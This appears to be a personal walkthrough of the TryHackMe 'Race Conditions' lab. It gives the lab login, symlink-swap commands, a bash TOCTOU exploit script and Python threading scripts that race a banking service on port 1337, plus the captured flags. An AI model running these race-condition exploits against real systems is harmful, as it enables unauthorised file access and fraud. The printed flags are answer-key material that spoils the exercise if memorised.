[TryHackMe | Race Conditions](https://tryhackme.com/room/raceconditions)

![[Pasted image 20230610070705.png]]

![[Pasted image 20230610070739.png]]

![[Pasted image 20230610070805.png]]

```
10.10.202.229
```

![[Pasted image 20230610070902.png]]

```
ssh race@10.10.202.229
```

```
Username: race

Password: car
```

![[Pasted image 20230610071320.png]]

![[Pasted image 20230610071439.png]]

![[Pasted image 20230610071551.png]]

```
file anti_flag_reader
```

```
file flag
```

```
cat anti_flag_reader.c
```

![[Pasted image 20230610071824.png]]

```
python3 -m http.server
```

```
http://10.10.202.229:8000/
```

![[Pasted image 20230610072259.png]]

![[Pasted image 20230610072324.png]]

![[Pasted image 20230610072612.png]]

![[Pasted image 20230610072652.png]]

![[Pasted image 20230610072918.png]]

![[Pasted image 20230610073052.png]]

![[Pasted image 20230610073349.png]]

![[Pasted image 20230610073726.png]]

![[Pasted image 20230611214454.png]]

![[Pasted image 20230611214548.png]]

[# File Path Race Condition & How To Prevent It - bin 0x31](https://www.youtube.com/watch?v=5g137gsB9Wk)

[# Race Conditions - SY0-601 CompTIA Security+ : 1.3](https://youtu.be/zg_kTCOcinQ)

## 15082023Tue

```
ssh race@10.10.253.224
```

```
Username: race
Password: car
```

```
ln -sf ../walk/flag file
```
![[Pasted image 20230815002916.png]]
![[Pasted image 20230815004352.png]]
![[Pasted image 20230815004429.png]]

```
THM{R4c3_c0nd1710n5_1n_7h3_f1l35y573m!}
```

![[Pasted image 20230815004628.png]]
![[Pasted image 20230815004843.png]]

```
nano ex-run.sh
```

```
#!/bin/bash

touch run-cat2
/home/run/./cat2 run-cat2 &
usleep 200
ln -sf /home/run/flag run-cat2
wait
rm run-cat2
```
![[Pasted image 20230815005538.png]]

```
THM{R4c1n6_f4573r_7h4n_y0ur_53cur17y_ch3ck5}
```

```
../sprint/./bankingsystem
```
![[Pasted image 20230815005853.png]]

```
nmap -sT -p 1337 10.10.253.224
```
![[Pasted image 20230815010024.png]]

```
nano ex-sprint.py
```

```
import socket
import threading

def send_request(command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server at IP '10.10.23.206' and port 1337
        sock.connect(('10.10.253.224', 1337))  
        # Send the command to the server (encoded as bytes)
        sock.sendall(command.encode())  
        # Receive the response from the server (up to 1024 bytes)
        response = sock.recv(1024) 
        # Print the response after decoding it from bytes to string 
        print(response.decode())  
        # Close the socket connection
        sock.close()  
    except Exception as e:
        print(f"Error: {str(e)}")

def run_concurrent_operations():
    # The command to be sent to the server
    deposit = "deposit"  
    for i in range(1, 1000):
        # Create a new thread with the send_request function as the target
        t1 = threading.Thread(target=send_request, args=(deposit,))  
        # Start the thread, allowing it to run concurrently with other threads
        t1.start()  
    # Wait for all the threads to finish before moving forward
    t1.join()  

# Call the run_concurrent_operations function to execute the program
run_concurrent_operations()  
```
![[Pasted image 20230815012026.png]]
![[Pasted image 20230815011946.png]]
```
import socket
import threading

def send_request(command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server at IP '10.10.23.206' and port 1337
        sock.connect(('10.10.253.224', 1337))  
        # Send the command to the server (encoded as bytes)
        sock.sendall(command.encode())  
        # Receive the response from the server (up to 1024 bytes)
        response = sock.recv(1024) 
        # Print the response after decoding it from bytes to string 
        print(response.decode())  
        # Close the socket connection
        sock.close()  
    except Exception as e:
        print(f"Error: {str(e)}")

def run_concurrent_operations():
    # The commands to be sent to the server
    deposit = "deposit"  
    flag = "purchase flag"  
    for i in range(1, 1000):
        # Create a new thread with the send_request function as the target
        t1 = threading.Thread(target=send_request, args=(deposit,)) 
        t2 = threading.Thread(target=send_request, args=(flag,))  
        # Start the thread, allowing it to run concurrently with other threads
        t1.start()  
        t2.start()
    # Wait for all the threads to finish before moving forward
    t1.join()  
    t2.join()

# Call the run_concurrent_operations function to execute the program
run_concurrent_operations()  
```
![[Pasted image 20230815012448.png]]
![[Pasted image 20230815012521.png]]

```
THM{R4c1n6_f0r_7h47_5w337_m0n3y_$$$$$}
```

![[Pasted image 20230815012600.png]]

https://0xb0b.gitbook.io/writeups/tryhackme/race-conditions
